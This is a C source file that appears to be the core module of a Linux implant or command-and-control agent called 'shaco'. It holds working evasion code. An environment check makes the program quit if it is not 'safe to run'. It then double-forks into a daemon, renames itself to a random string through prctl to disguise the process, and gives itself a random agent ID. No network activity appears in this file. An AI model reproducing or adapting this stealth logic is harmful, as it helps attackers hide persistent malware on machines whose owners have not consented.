#include "Core.h"
#include "Commands.h"

#include "../Config/Settings.h"
#include "../Helpers/Protect.h"

#include <sys/prctl.h>


void daemonize(){
#ifdef DAEMONIZE
    pid_t _t = s_fork();
    if(_t < 0 || _t > 0) shaco_exit();
    s_setsid();
    s_signal(SIGCHLD, SIG_IGN);
    s_signal(SIGHUP, SIG_IGN);
    _t = s_fork();
    if (_t < 0 || _t > 0) shaco_exit();
    s_umask(0);
    s_chdir("/");
#endif
}


bool shaco_init(char **argv){
    MSG("Checking if is safe to run");
    if(!is_safe_to_run()) { MSG("Is not safe to run"); return false;}

    daemonize();

    char *procname = generate_random_str(generate_random_int(3,7));
    s_prctl(15, procname);

    PSETTINGS ps = get_settings();
#ifndef DEBUG
    ps->agent_id = generate_random_int(1111, 999999);
#else
    ps->agent_id = 0;
#endif

    return true;
}

void shaco_exit(){ s__exit(1); }

void shaco_sleep(int value){
    if(value <= 0) return;
    struct timespec req, rem;
    req.tv_sec = value;
    req.tv_nsec = 0;
    while(s_nanosleep(&req, &rem))
        req = rem;
    return;
}
